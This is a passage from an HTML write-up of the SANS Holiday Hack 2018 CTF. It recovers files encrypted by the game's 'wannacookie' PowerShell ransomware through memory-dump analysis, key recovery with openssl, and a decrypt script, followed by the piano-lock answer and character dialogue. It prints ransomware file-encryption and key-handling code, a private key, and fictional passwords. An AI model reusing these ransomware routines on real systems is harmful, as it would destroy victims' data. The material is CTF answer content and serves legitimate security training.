<span style="color: rgb(181, 137, 0);">      \\</span>    <span style="color: rgb(211, 54, 130);">( \_</span>     <span style="color: rgb(181, 137, 0);">//</span>
<span style="color: rgb(181, 137, 0);">       `\</span> <span style="color: rgb(211, 54, 130);">_(_\ \)__</span> <span style="color: rgb(181, 137, 0);">/'</span>
         <span style="color: rgb(211, 54, 130);">(____\___))</span>
<span style="color: rgb(73, 113, 126);">  _____  _    _ __  __ _____</span>
<span style="color: rgb(73, 113, 126);"> |  __ \| |  | |  \/  |  __ \</span>
<span style="color: rgb(73, 113, 126);"> | |  | | |  | | \  / | |__) |</span>
<span style="color: rgb(73, 113, 126);"> | |  | | |  | | |\/| |  ___/</span>
<span style="color: rgb(73, 113, 126);"> | |__| | |__| | |  | | |</span>
<span style="color: rgb(73, 113, 126);"> |_____/ \____/|_|  |_|_|</span>
<span style="color: rgb(73, 113, 126);">Dumps PowerShell From Memory</span>
<span style="color: rgb(73, 113, 126);">==============================</span>
=======================================
1. Load PowerShell Memory Dump File
2. Process PowerShell Memory Dump
3. Search/Dump Powershell Scripts
4. Search/Dump Stored PS Variables
e. Exit
: 1

============ Load Dump Menu ================
COMMAND |     ARGUMENT       | Explanation
========|====================|==============
ld      | /path/to/file.name | load mem dump
ls      | ../directory/path  | list files
B       |                    | back to menu
============= Loaded File: =================

============================================
: ld powershell.exe_181109_104716.dmp

============ Load Dump Menu ================
COMMAND |     ARGUMENT       | Explanation
========|====================|==============
ld      | /path/to/file.name | load mem dump
ls      | ../directory/path  | list files
B       |                    | back to menu
============= Loaded File: =================
<span style="color: rgb(68, 182, 54);">powershell.exe_181109_104716.dmp 427762187</span>
============================================
: b

============ Main Menu ================
<span style="color: rgb(68, 182, 54);">Memory Dump: powershell.exe_181109_104716.dmp</span>
<span style="color: rgb(68, 182, 54);">Loaded     : True</span>
<span style="color: rgb(220, 50, 47);">Processed  : False</span>
=======================================
1. Load PowerShell Memory Dump File
2. Process PowerShell Memory Dump
3. Search/Dump Powershell Scripts
4. Search/Dump Stored PS Variables
e. Exit
: 2
<span style="color: rgb(181, 137, 0);">[i] Please wait, processing memory dump...</span>
<span style="color: rgb(68, 182, 54);">[+] Found 65 script blocks!</span>
<span style="color: rgb(68, 182, 54);">[+] Found some Powershell variable names to work with...</span>
<span style="color: rgb(68, 182, 54);">[+] Found 10947 possible variables stored in memory</span>
Would you like to save this processed data for quick processing later "Y"es or "N"o?
: Y

<span style="color: rgb(68, 182, 54);">Successfully Processed Memory Dump!</span>

Press Enter to Continue...

============ Main Menu ================
<span style="color: rgb(68, 182, 54);">Memory Dump: powershell.exe_181109_104716.dmp</span>
<span style="color: rgb(68, 182, 54);">Loaded     : True</span>
<span style="color: rgb(68, 182, 54);">Processed  : True</span>
=======================================
1. Load PowerShell Memory Dump File
2. Process PowerShell Memory Dump
3. Search/Dump Powershell Scripts
4. Search/Dump Stored PS Variables
e. Exit</pre>
        <p>Before moving forward we should probably determine what we're looking for. Our goal is to decrypt the wannacookie file. Let's see what part of the script does this.</p>
        <pre class="text-monospace bg-dark text-light p-2" style="white-space: pre-wrap">[array]$f_c = $(Get-ChildItem *.elfdb -Exclude *.wannacookie -Path $($($env:userprofile + '\Desktop'),$($env:userprofile + '\Documents'),$($env:userprofile + '\Videos'),$($env:userprofile + '\Pictures'),$($env:userprofile + '\Music')) -Recurse | Where-Object { !$_.PSIsContainer } | ForEach-Object { $_.FullName });
e_n_d $b_k $f_c $true;
Clear-Variable -Name "h_k";
Clear-Variable -Name "b_k";</pre>
        <p>This part of the <kbd>wanc</kbd> function appears to look for elfdb files and then add them to an array variable <b>$f_c</b>. That array is then a parameter for the function <kbd>e_n_d</kbd></p>
        <pre class="text-monospace bg-dark text-light p-2" style="white-space: pre-wrap">function e_n_d { param($key,$allfiles,$make_cookie);
  $tcount = 12;
  for ($file = 0;
    $file -lt $allfiles.Length;
    $file++) { while ($true) { $running = @(Get-Job | Where-Object { $_.State -eq 'Running' });
      if ($running.count -le $tcount) { Start-Job -ScriptBlock { param($key,$File,$true_false);
          try { e_d_file $key $File $true_false } catch { $_.Exception.Message | Out-String | Out-File $($env:userprofile + '\Desktop\ps_log.txt') -Append } } -args $key,$allfiles[$file],$make_cookie -InitializationScript $functions;
        break } else { Start-Sleep -m 200;
        continue }
      }
    }
  };</pre>
        <p>It looks like it takes a variable, <kbd>$b_k</kbd>, as a key to encrypt the file. Let's back up a little and see where these variables come from.</p>
        <pre class="text-monospace bg-dark text-light p-2" style="white-space: pre-wrap">$p_k = [System.Convert]::FromBase64String($(g_o_dns ("7365727665722E637274")));
$b_k = ([System.Text.Encoding]::Unicode.GetBytes($(([char[]]([char]01..[char]255) + ([char[]]([char]01..[char]255)) + 0..9 | sort { Get-Random })[0..15] -join '')) | Where-Object { $_ -ne 0x00 });
$h_k = $(B2H $b_k);
$k_h = $(sh1 $h_k);
$p_k_e_k = (p_k_e $b_k $p_k).ToString();

function p_k_e ($key_bytes,[byte[]]$pub_bytes) {
  $cert = New-Object -TypeName System.Security.Cryptography.X509Certificates.X509Certificate2;
  $cert.Import($pub_bytes);
  $encKey = $cert.PublicKey.Key.Encrypt($key_bytes,$true);
  return $(B2H $encKey)
};
</pre>
        <ul>
          <li><kbd>$p_k</kbd> - Public Key - This is filled from the return of a function called <kbd>g_o_dns</kbd>. The g_o_dns function looks exactly like the DNS TXT query function we found in the docm macro. It appears to be downloading a file called <code>server.crt</code>. <code>server.crt</code> are usually one pair of a public/private key pair for asymmetric encryption.</li>
          <li><kbd>$b_k</kbd> - Byte Key - This appears to be a 16 byte array that is randomly generated. This key is cleared from memory later.</li>
          <li><kbd>$h_k</kbd> - Hex Key - This is the hex version of the Byte key. This key is cleared from memory later.</li>
          <li><kbd>$p_k_e_k</kbd> - Public Key Encrypted Key - This appears to take the public key and the byte key and runs them throught the function <kbd>p_k_e</kbd>. What's returned is the byte key encrypted with the public key. This key is NOT cleared later.</li>
        </ul>
        <p>What we need is the Byte Key, but that's unfortunately cleared from memory. What is NOT cleared is the Public Key Encrypted Key. We may be able to find that in memory and decrypt it if we can find the private key. First let's see if we can find the private key. Recalling the app.js source code and public key management in general, server.crt files are generally accompanied by the server.key file which is it's associated private key. Let's see if the <code>server.key</code> exists on the server. We can reuse the <kbd>g_o_dns</kbd> function to try to pull down the server.key using of the to malware's own functions.</p>
        <pre class="text-monospace bg-dark text-light p-2" style="white-space: pre-wrap">g_o_dns($(A2H("server.key")))
-----BEGIN PRIVATE KEY-----
MIIEvgIBADANBgkqhkiG9w0BAQEFAASCBKgwggSkAgEAAoIBAQDEiNzZVUbXCbMG
L4sM2UtilR4seEZli2CMoDJ73qHql+tSpwtK9y4L6znLDLWSA6uvH+lmHhhep9ui
W3vvHYCq+Ma5EljBrvwQy0e2Cr/qeNBrdMtQs9KkxMJAz0fRJYXvtWANFJF5A+Nq
jI+jdMVtL8+PVOGWp1PA8DSW7i+9eLkqPbNDxCfFhAGGlHEU+cH0CTob0SB5Hk0S
TPUKKJVc3fsD8/t60yJThCw4GKkRwG8vqcQCgAGVQeLNYJMEFv0+WHAt2WxjWTu3
HnAfMPsiEnk/y12SwHOCtaNjFR8Gt512D7idFVW4p5sT0mrrMiYJ+7x6VeMIkrw4
tk/1ZlYNAgMBAAECggEAHdIGcJOX5Bj8qPudxZ1S6uplYan+RHoZdDz6bAEj4Eyc
0DW4aO+IdRaD9mM/SaB09GWLLIt0dyhRExl+fJGlbEvDG2HFRd4fMQ0nHGAVLqaW
OTfHgb9HPuj78ImDBCEFaZHDuThdulb0sr4RLWQScLbIb58Ze5p4AtZvpFcPt1fN
6YqS/y0i5VEFROWuldMbEJN1x+xeiJp8uIs5KoL9KH1njZcEgZVQpLXzrsjKr67U
3nYMKDemGjHanYVkF1pzv/rardUnS8h6q6JGyzV91PpLE2I0LY+tGopKmuTUzVOm
Vf7sl5LMwEss1g3x8gOh215Ops9Y9zhSfJhzBktYAQKBgQDl+w+KfSb3qZREVvs9
uGmaIcj6Nzdzr+7EBOWZumjy5WWPrSe0S6Ld4lTcFdaXolUEHkE0E0j7H8M+dKG2
Emz3zaJNiAIX89UcvelrXTV00k+kMYItvHWchdiH64EOjsWrc8co9WNgK1XlLQtG
4iBpErVctbOcjJlzv1zXgUiyTQKBgQDaxRoQolzgjElDG/T3VsC81jO6jdatRpXB
0URM8/4MB/vRAL8LB834ZKhnSNyzgh9N5G9/TAB9qJJ+4RYlUUOVIhK+8t863498
/P4sKNlPQio4Ld3lfnT92xpZU1hYfyRPQ29rcim2c173KDMPcO6gXTezDCa1h64Q
8iskC4iSwQKBgQCvwq3f40HyqNE9YVRlmRhryUI1qBli+qP5ftySHhqy94okwerE
KcHw3VaJVM9J17Atk4m1aL+v3Fh01OH5qh9JSwitRDKFZ74JV0Ka4QNHoqtnCsc4
eP1RgCE5z0w0efyrybH9pXwrNTNSEJi7tXmbk8azcdIw5GsqQKeNs6qBSQKBgH1v
sC9DeS+DIGqrN/0tr9tWklhwBVxa8XktDRV2fP7XAQroe6HOesnmpSx7eZgvjtVx
moCJympCYqT/WFxTSQXUgJ0d0uMF1lcbFH2relZYoK6PlgCFTn1TyLrY7/nmBKKy
DsuzrLkhU50xXn2HCjvG1y4BVJyXTDYJNLU5K7jBAoGBAMMxIo7+9otN8hWxnqe4
Ie0RAqOWkBvZPQ7mEDeRC5hRhfCjn9w6G+2+/7dGlKiOTC3Qn3wz8QoG4v5xAqXE
JKBn972KvO0eQ5niYehG4yBaImHH+h6NVBlFd0GJ5VhzaBJyoOk+KnOnvVYbrGBq
UdrzXvSwyFuuIqBlkHnWSIeC
-----END PRIVATE KEY-----</pre>
        <p>Great! Now we have a private key. We just need to get the <kbd>$p_k_e_k</kbd> value out of memory. Let's see what that would look like.</p>
        <pre class="text-monospace bg-dark text-light p-2" style="white-space: pre-wrap">PS C:\Users\PerroDeGuerra> $p_k = [System.Convert]::FromBase64String($(g_o_dns ("7365727665722E637274")));
PS C:\Users\PerroDeGuerra> $b_k = ([System.Text.Encoding]::Unicode.GetBytes($(([char[]]([char]01..[char]255) + ([char[]]([char]01..[char]255)) + 0..9
| sort { Get-Random })[0..15] -join '')) | Where-Object { $_ -ne 0x00 });
PS C:\Users\PerroDeGuerra> function p_k_e ($key_bytes,[byte[]]$pub_bytes) { $cert = New-Object -TypeName System.Security.Cryptography.X509Certificates
.X509Certificate2;
>>   $cert.Import($pub_bytes);
>>   $encKey = $cert.PublicKey.Key.Encrypt($key_bytes,$true);
>>   return $(B2H $encKey) };
PS C:\Users\PerroDeGuerra> (p_k_e $b_k $p_k).ToString()
<span style="color: rgb(73, 113, 126);">3cf903522e1a3966805b50e7f7dd51dc7969c73cfb1663a75a56ebf4aa4a1849d1949005437dc44b8464dca05680d531b7a971672d87b24b7a6d672d1d811e6c
34f42b2f8d7f2b43aab698b537d2df2f401c2a09fbe24c5833d2c5861139c4b4d3147abb55e671d0cac709d1cfe86860b6417bf019789950d0bf8d83218a56e6
9309a2bb17dcede7abfffd065ee0491b379be44029ca4321e60407d44e6e381691dae5e551cb2354727ac257d977722188a946c75a295e714b668109d75c0010
0b94861678ea16f8b79b756e45776d29268af1720bc49995217d814ffd1e4b6edce9ee57976f9ab398f9a8479cf911d7d47681a77152563906a2c29c6d12f971</span></pre>
        <p>That final hex string is 512 characters long. Let's see if we can find something in memory that big.</p>
        <pre class="text-monospace bg-dark text-light p-2" style="white-space: pre-wrap">============ Main Menu ================
Memory Dump: powershell.exe_181109_104716.dmp
Loaded     : True
Processed  : True
=======================================
1. Load PowerShell Memory Dump File
2. Process PowerShell Memory Dump
3. Search/Dump Powershell Scripts
4. Search/Dump Stored PS Variables
e. Exit
: 4

<span style="color: rgb(181, 137, 0);">[i] 10947 powershell Variable Values found!</span>
============== Search/Dump PS Variable Values ===================================
COMMAND        |     ARGUMENT                | Explanation
===============|=============================|=================================
print          | print [all|num]             | print specific or all Variables
dump           | dump [all|num]              | dump specific or all Variables
contains       | contains [ascii_string]     | Variable Values must contain string
matches        | matches "[python_regex]"    | match python regex inside quotes
len            | len [>|<|>=|<=|==] [bt_size]| Variables length >,<,=,>=,<= size
clear          | clear [all|num]             | clear all or specific filter num
===============================================================================
: matches "^[0-9a-fA-F]+$"

================ Filters ================
<span style="color: rgb(68, 182, 54);">1| MATCHES  bool(re.search(r"^[0-9a-fA-F]+$",variable_values))</span>

<span style="color: rgb(181, 137, 0);">[i] 196 powershell Variable Values found!</span>
============== Search/Dump PS Variable Values ===================================
COMMAND        |     ARGUMENT                | Explanation
===============|=============================|=================================
print          | print [all|num]             | print specific or all Variables
dump           | dump [all|num]              | dump specific or all Variables
contains       | contains [ascii_string]     | Variable Values must contain string
matches        | matches "[python_regex]"    | match python regex inside quotes
len            | len [>|<|>=|<=|==] [bt_size]| Variables length >,<,=,>=,<= size
clear          | clear [all|num]             | clear all or specific filter num
===============================================================================
: len == 512

================ Filters ================
<span style="color: rgb(68, 182, 54);">1| MATCHES  bool(re.search(r"^[0-9a-fA-F]+$",variable_values))</span>
<span style="color: rgb(68, 182, 54);">2| LENGTH  len(variable_values) == 512</span>

<span style="color: rgb(181, 137, 0);">[i] 1 powershell Variable Values found!</span>
============== Search/Dump PS Variable Values ===================================
COMMAND        |     ARGUMENT                | Explanation
===============|=============================|=================================
print          | print [all|num]             | print specific or all Variables
dump           | dump [all|num]              | dump specific or all Variables
contains       | contains [ascii_string]     | Variable Values must contain string
matches        | matches "[python_regex]"    | match python regex inside quotes
len            | len [>|<|>=|<=|==] [bt_size]| Variables length >,<,=,>=,<= size
clear          | clear [all|num]             | clear all or specific filter num
===============================================================================
: print
<span class="pre-wrap" style="color: rgb(73, 113, 126);">3cf903522e1a3966805b50e7f7dd51dc7969c73cfb1663a75a56ebf4aa4a1849d1949005437dc44b8464dca05680d531b7a971672d87b24b7a6d672d1d811e6c
34f42b2f8d7f2b43aab698b537d2df2f401c2a09fbe24c5833d2c5861139c4b4d3147abb55e671d0cac709d1cfe86860b6417bf019789950d0bf8d83218a56e6
9309a2bb17dcede7abfffd065ee0491b379be44029ca4321e60407d44e6e381691dae5e551cb2354727ac257d977722188a946c75a295e714b668109d75c0010
0b94861678ea16f8b79b756e45776d29268af1720bc49995217d814ffd1e4b6edce9ee57976f9ab398f9a8479cf911d7d47681a77152563906a2c29c6d12f971</span>
Variable Values #1 above ^
Type any key to go back and just Enter to Continue...</pre>
        <p>Ok, so, no we have our <kbd>$p_k_e_k</kbd> and our private key. We just need to decrypt the encrypted blob. We can do this using a one-liner with openssl.</p>
        <pre class="text-monospace bg-dark text-light p-2" style="white-space: pre-wrap">echo 3cf903522e1a3966805b50e7f7dd51dc7969c73cfb1663a749d1949005437dc44b8464dca05680d531b7a971672d87b24b7a6d672d1d811e6c34f42b2f8d7f2b43aab698b537d2df2f401c2a09fbe24c5833d2c5861139c4b4d3147abb55e671d0cac709d1cfe86860b6417bf019789950d0bf8d83218a56e69309a2bb17dcede7abfffd065ee0491b379be44029ca4321e60407d44e6e381691dae5e551cb2354727ac257d977722188a946c75a295e714b668109d75c00100b94861678ea16f8b79b756e45776d29268af1720bc49995217d814ffd1e4b6edce9ee57976f9ab398f9a8479cf911d7d47681a77152563906a2c29c6d12f971 | xxd -r -p | openssl rsautl -oaep -decrypt -inkey ../server.key | xxd -p
fbcfc121915d99cc20a3d3d5d84f8308</pre>
        <p>And there is our hex encoded encryption key. Let's use the function in wannacookie to decrypt our elfdb file now. <a href="scripts/decrypt.ps1">We'll just write our own powershell script using the wannacookie functions to decrypt our file.</a></p>
        <pre class="text-monospace bg-dark text-light p-2" style="white-space: pre-wrap">$p_keys = "fbcfc121915d99cc20a3d3d5d84f8308"

$functions = {
  function e_d_file ($key,$File,$enc_it,$rep) { [byte[]]$key = $key;
    $Suffix = "`.wannacookie";
    [System.Reflection.Assembly]::LoadWithPartialName('System.Security.Cryptography');
    [System.Int32]$KeySize = $key.Length * 8;
    $AESP = New-Object 'System.Security.Cryptography.AesManaged';
    $AESP.Mode = [System.Security.Cryptography.CipherMode]::CBC;
    $AESP.BlockSize = 128;
    $AESP.KeySize = $KeySize;
    $AESP.Key = $key;
    $FileSR = New-Object System.IO.FileStream ($File,[System.IO.FileMode]::Open);
    if ($enc_it) { $DestFile = $File + $Suffix } else { $DestFile = ($File -replace $Suffix,$rep) };
    $FileSW = New-Object System.IO.FileStream ($DestFile,[System.IO.FileMode]::Create);
    if ($enc_it) { $AESP.GenerateIV();
      $FileSW.Write([System.BitConverter]::GetBytes($AESP.IV.Length),0,4);
      $FileSW.Write($AESP.IV,0,$AESP.IV.Length);
      $Transform = $AESP.CreateEncryptor() } else { [Byte[]]$LenIV = New-Object Byte[] 4;
      $FileSR.Seek(0,[System.IO.SeekOrigin]::Begin) | Out-Null;
      $FileSR.Read($LenIV,0,3) | Out-Null;
      [int]$LIV = [System.BitConverter]::ToInt32($LenIV,0);
      [Byte[]]$IV = New-Object Byte[] $LIV;
      $FileSR.Seek(4,[System.IO.SeekOrigin]::Begin) | Out-Null;
      $FileSR.Read($IV,0,$LIV) | Out-Null;
      $AESP.IV = $IV;
      $Transform = $AESP.CreateDecryptor() };
    $CryptoS = New-Object System.Security.Cryptography.CryptoStream ($FileSW,$Transform,[System.Security.Cryptography.CryptoStreamMode]::Write);
    [int]$Count = 0;
    [int]$BlockSzBts = $AESP.BlockSize / 8;
    [Byte[]]$Data = New-Object Byte[] $BlockSzBts;
    do {
      $Count = $FileSR.Read($Data,0,$BlockSzBts);
      $CryptoS.Write($Data,0,$Count)
    } while ($Count -gt 0);
    $CryptoS.FlushFinalBlock();
    $CryptoS.Close();
    $FileSR.Close();
    $FileSW.Close();
    Clear-Variable -Name "key";
    Remove-Item $File
  }
};

function B2H { param($DEC);
  $tmp = '';
  foreach ($value in $DEC) { $a = "{0:x}" -f [int]$value;
    if ($a.Length -eq 1) { $tmp += '0' + $a } else { $tmp += $a }
  };
  return $tmp
};

function H2B { param($HX);
  $HX = $HX -split '(..)' | Where-Object { $_ };
  foreach ($value in $HX) { [Convert]::ToInt32($value,16) }
};

function e_n_d { param($key,$allfiles,$make_cookie);
  $tcount = 12;
  for ($file = 0;
    $file -lt $allfiles.Length;
    $file++) { while ($true) { $running = @(Get-Job | Where-Object { $_.State -eq 'Running' });
      if ($running.count -le $tcount) { Start-Job -ScriptBlock {
        param($key,$File,$true_false);
          try {
            e_d_file $key $File $true_false
          } catch {
            $_.Exception.Message | Out-String | Out-File $($env:userprofile + '\Desktop\ps_log.txt') -Append
          }
        } -args $key,$allfiles[$file],$make_cookie -InitializationScript $functions;
        break
      } else {
        Start-Sleep -m 200;
        continue
      }
    }
  }
};

[array]$f_c = $(Get-ChildItem *.wannacookie | ForEach-Object { $_.Fullname } );
foreach ($possible in $p_keys) {
  $b_k = $(H2B $possible);
  e_n_d $b_k $f_c $false $possible;
}</pre>
        <p></p>
        <pre class="text-monospace bg-dark text-light p-2" style="white-space: pre-wrap">PS C:\Users\PerroDeGuerra> .\decrypt.ps1

Id     Name            PSJobTypeName   State         HasMoreData     Location             Command
--     ----            -------------   -----         -----------     --------             -------
1      Job1            BackgroundJob   Running       True            localhost            ...</pre>
        <p>Looks like it may have worked. Let's take a closer look</p>
        <pre class="text-monospace bg-dark text-light p-2" style="white-space: pre-wrap"><span style="color: rgb(0, 186, 19); font-weight: bold;">elf@776172646f67</span>$ file alabaster_passwords.elfdb
alabaster_passwords.elfdb: SQLite 3.x database, last written using SQLite version 3015002
<span style="color: rgb(0, 186, 19); font-weight: bold;">elf@776172646f67</span>$ sqlite3 alabaster_passwords.elfdb .dump
PRAGMA foreign_keys=OFF;
BEGIN TRANSACTION;
CREATE TABLE IF NOT EXISTS "passwords" (
        `name`  TEXT NOT NULL,
        `password`      TEXT NOT NULL,
        `usedfor`       TEXT NOT NULL
);
INSERT INTO passwords VALUES('alabaster.snowball','CookiesR0cK!2!#','active directory');
INSERT INTO passwords VALUES('alabaster@kringlecastle.com','KeepYourEnemiesClose1425','www.toysrus.com');
INSERT INTO passwords VALUES('alabaster@kringlecastle.com','CookiesRLyfe!*26','netflix.com');
INSERT INTO passwords VALUES('alabaster.snowball','MoarCookiesPreeze1928','Barcode Scanner');
INSERT INTO passwords VALUES('alabaster.snowball','ED#ED#EED#EF#G#F#G#ABA#BA#B','vault');
INSERT INTO passwords VALUES('alabaster@kringlecastle.com','PetsEatCookiesTOo@813','neopets.com');
INSERT INTO passwords VALUES('alabaster@kringlecastle.com','YayImACoder1926','www.codecademy.com');
INSERT INTO passwords VALUES('alabaster@kringlecastle.com','Woootz4Cookies19273','www.4chan.org');
INSERT INTO passwords VALUES('alabaster@kringlecastle.com','ChristMasRox19283','www.reddit.com');
COMMIT;</pre>
        <p>It looks like our file was decrypted and now we have access to the SQLite database that held Alabaster's passwords.</p>
        <button class="btn btn-success">ED#ED#EED#EF#G#F#G#ABA#BA#B</button>
      </div>

      <div class="border p-2 m-2">
        <div class="dropdown">
          <button class="btn btn-dark dropdown-toggle" type="button" id="dropdownMenuButton" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
            <a id="objx"></a>Objective 10
          </button>
          <div class="dropdown-menu" aria-labelledby="dropdownMenuButton">
            <a class="dropdown-item" href="#objx">Piano Lock</a>
          </div>
        </div>
        <p>Use what you have learned from previous challenges to open the <a href="https://pianolockn.kringlecastle.com/">door to Santa's vault</a>. What message do you get when you unlock the door?</p>
        <hr class="my-4">
        <p>Now that we have the password for the piano lock we should open Santa's vault. Trying this sequence actually does nothing. Something must be amiss. If we recall Holly's email to Alabaster, his favorit key is D and the pdf she sent was about transcribing music. So let's transcribe from E to D.</p>
        <pre class="text-monospace bg-dark text-light p-2" style="white-space: pre-wrap">E D# E D# E E D# E F# G# F# G# A B A# B A# B
D C# D C# D D C# D E F# E F# G A G# A G# A</pre>
        <p>This sequence DOES unlock the door and faintly reminds me of Rachmaninoff... Er, I mean Mozart... Darn Mrs. Teevee throwing me off...</p>
        <button class="btn btn-success">You have unlocked Santa's vault!</button>
      </div>
    </div>

    <div class="container m-4 p-4">
      <h1><a id="npc"></a>Characters</h1>
        <p>These are the dialogs from the different characters in Kringle Con.</p>

      <div class="row border p-2 m-2">
        <div class="col-3">
          <h2><a id="npcSanta"></a>Santa</h2>
          <img src="images/santa.png">
        </div>
        <div class="col-9">
          <blockquote class="blockquote border rounded p-2">
            <p class="mb-2">Welcome, my friends! Welcome to my castle! Would you come forward please?</p>
            <p class="mb-2">Welcome. It’s nice to have you here! I’m so glad you could come. This is going to be such an exciting day!</p>
            <p class="mb-2">I hope you enjoy it. I think you will.</p>
            <p class="mb-2">Today is the start of KringleCon, our new conference for cyber security practitioners and hackers around the world.</p>
            <p class="mb-2">KringleCon is designed to share tips and tricks to help leverage our skills to make the world a better, safer place.</p>
            <p class="mb-2">Remember to look around, enjoy some talks by world-class speakers, and mingle with our other guests.</p>
            <p class="mb-2">And, if you are interested in the background of this con, please check out Ed Skoudis’ talk called <a href="https://youtu.be/31JsKzsbFUo">START HERE</a>.</p>
            <p class="mb-2">Delighted to meet you. Overjoyed! Enraptured! Entranced! Are we ready? Yes! In we go!</p>
            <p class="mb-2">Oh, and as you enjoy the conference, click on your badge to see a series of objectives for you to conquer!</p>
            <footer class="blockquote-footer text-right">Santa as you approach the castle</footer>
          </blockquote>
          <blockquote class="blockquote border rounded p-2">
            <p class="mb-2">HO HO HO!!!</p>
            <p class="mb-2">You did a great job, but keep going!</p>
            <p class="mb-2">Solve all remaining objectives in your badge.</p>
            <footer class="blockquote-footer text-right">Santa after stopping Hans</footer>
          </blockquote>
          <blockquote class="blockquote border rounded p-2">
            <p class="mb-2">You DID IT! You completed the hardest challenge. You see, Hans and the soldiers work for ME. I had to test you. And you passed the test!</p>
            <p class="mb-2">You WON! Won what, you ask? Well, the jackpot, my dear! The grand and glorious jackpot!</p>
            <p class="mb-2">You see, I finally found you!</p>
            <p class="mb-2">I came up with the idea of KringleCon to find someone like you who could help me defend the North Pole against even the craftiest attackers.</p>
            <p class="mb-2">That’s why we had so many different challenges this year.</p>
            <p class="mb-2">We needed to find someone with skills all across the spectrum.</p>
            <p class="mb-2">I asked my friend Hans to play the role of the bad guy to see if you could solve all those challenges and thwart the plot we devised.</p>
            <p class="mb-2">And you did!</p>
            <p class="mb-2">Oh, and those brutish toy soldiers? They are really just some of my elves in disguise.</p>
            <p class="mb-2">See what happens when they take off those hats?</p>
            <p class="mb-2">Based on your victory… next year, I’m going to ask for your help in defending my whole operation from evil bad guys.</p>
            <p class="mb-2">And welcome to my vault room. Where's my treasure? Well, my treasure is Christmas joy and good will.</p>
            <p class="mb-2">You did such a GREAT job! And remember what happened to the people who suddenly got everything they ever wanted?</p>
            <p class="mb-2">They lived happily ever after.</p>
            <footer class="blockquote-footer text-right">Santa after accessing the Vault</footer>
          </blockquote>
        </div>
      </div>

      <div class="row border rounded p-2 m-2">
        <div class="row">
          <div class="col-3">
            <h2><a id="npcHans"></a>Hans</h2>
            <img src="images/hans.png">
          </div>
          <div class="col-9">
            <blockquote class="blockquote border rounded p-2">
              <p class="mb-2">Ladies and Gentlemen…</p>
              <p class="mb-2">Ladies and Gentlemen…</p>
              <p class="mb-2">Due to the North Pole’s legacy of providing coal as presents around the globe ...</p>
              <p class="mb-2">... they are about to be taught a lesson in the real use of POWER.</p>
              <p class="mb-2">You will be witnesses.</p>
              <p class="mb-2">Now, Santa… that's a nice suit… John Philips, North Pole. I have two myself. Rumor has it Alabaster buys his there.</p>
              <p class="mb-2">I have comrades in arms around the world who are languishing in prison.</p>
              <p class="mb-2">The Elvin State Department enjoys rattling its saber for its own ends. Now it can rattle it for ME.</p>
              <p class="mb-2">The following people are to be released from their captors.</p>
              <p class="mb-2">In the Dungeon for Errant Reindeer, the seven members of the New Arietes Front.</p>
              <p class="mb-2">In Whoville Prison, the imprisoned leader of ATNAS Corporation, Miss Cindy Lou Who.</p>
              <p class="mb-2">In the Land of Oz, Glinda the Good Witch.</p>
              <footer class="blockquote-footer text-right">Hans after solving <a href="#obj4">objective 4</a></footer>
            </blockquote>
            <blockquote class="blockquote border rounded p-2">
              <p class="mb-2">So, you’ve figured out my plan – it’s not about freeing those prisoners.</p>
              <p class="mb-2">The toy soldiers and I are here to steal the contents of Santa’s vault!</p>
              <p class="mb-2">You think that after all my posturing, all my little speeches, that I’m nothing but a common thief.</p>
              <p class="mb-2">But, I tell you -- I am an exceptional thief.</p>
              <p class="mb-2">And since I've moved up to kidnapping all of you, you should be more polite!</p>
              <footer class="blockquote-footer text-right">Hans after solving <a href="#obj6">objective 6</a></footer>
            </blockquote>
          </div>
          <div class="col-3">
            <img src="images/hans_snow_150.png">
          </div>
          <div class="col-9">
            <blockquote class="blockquote border rounded p-2">
              <p class="mb-2">You’ve found me and blocked my access to Santa’s treasure.</p>
              <p class="mb-2">You’ve done well in foiling me. But, I’ve still got a chance.</p>
              <p class="mb-2">When you steal six hundred dollars, you can disappear. When you steal all of Santa’s treasure, they will find you… unless….</p>
              <p class="mb-2">(muffled yelling)</p>
              <footer class="blockquote-footer text-right">Hans when defeated</footer>
            </blockquote>
          </div>
          <div class="col-3">
            <img src="images/hans_smile.PNG">
          </div>
          <div class="col-9">
            <blockquote class="blockquote border rounded p-2">
              <p class="mb-2">It’s a pleasure to see you again.</p>
              <p class="mb-2">Congratulations.</p>
              <footer class="blockquote-footer text-right">Hans in the Vault</footer>
            </blockquote>
          </div>
        </div>
      </div>

      <div class="row border rounded p-2 m-2">
        <div class="col-3">
          <div class="dropdown">
            <button class="btn btn-info dropdown-toggle" type="button" id="dropdownMenuButton" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
              <a id="npcBushy"></a>Bushy Evergreen
            </button>
            <div class="dropdown-menu" aria-labelledby="dropdownMenuButton">
              <a class="dropdown-item" href="#hntBushy">Bushy Evergreen Hints</a>
              <a class="dropdown-item" href="#obj1">Objective 1</a>
              <a class="dropdown-item" href="#termViescape">Essential Editor Skills</a>
            </div>
          </div>
          <p><img src="images/elf-bushy-evergreen.png"></p>
        </div>
        <div class="col-9">
          <blockquote class="blockquote border rounded p-2">
            <p class="mb-2">Hi, I'm Bushy Evergreen.</p>
            <p class="mb-2">I'm glad you're here, I'm the target of a terrible trick.</p>
            <p class="mb-2">Pepper says his editor is the best, but I don't understand why.</p>
            <p class="mb-2">He's forcing me to learn vi.</p>
            <p class="mb-2">He gave me a link, I'm supposed to learn the basics.</p>
            <p class="mb-2">Can you assist me with one of the simple cases?</p>
            <footer class="blockquote-footer text-right">Bushy Evergreen before solving <a href="#termViescape"><b>Essential Editor Skills</b></a></footer>
          </blockquote>
          <blockquote class="blockquote border rounded p-2">
            <p class="mb-2">Wow, it seems so easy now that you've shown me how!</p>
            <p class="mb-2">To thank you, I'd like to share some other tips with you.</p>
            <p class="mb-2">Have you taken a look at the Orientation Challenge?</p>
            <p class="mb-2">This challenge is limited to past SANS Holiday Hack Challenges from 2015, 2016, and 2017. You DO NOT need to play those challenges.</p>
            <p class="mb-2">If you listen closely to Ed Skoudis' talk at the con, you might even pick up all the answers you need...</p>
            <p class="mb-2">It may take a little poking around, but with your skills, I'm sure it'll be a wintergreen breeze!</p>
            <footer class="blockquote-footer text-right">Bushy Evergreen after solving <a href="#termViescape"><b>Essential Editor Skills</b></a></footer>
          </blockquote>
        </div>
      </div>

      <div class="row border rounded p-2 m-2">
        <div class="col-3">
          <div class="dropdown">
            <button class="btn btn-info dropdown-toggle" type="button" id="dropdownMenuButton" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
              <a id="npcMinty"></a>Minty Candycane
            </button>
            <div class="dropdown-menu" aria-labelledby="dropdownMenuButton">
              <a class="dropdown-item" href="#hntMinty">Minty Candycane Hints</a>
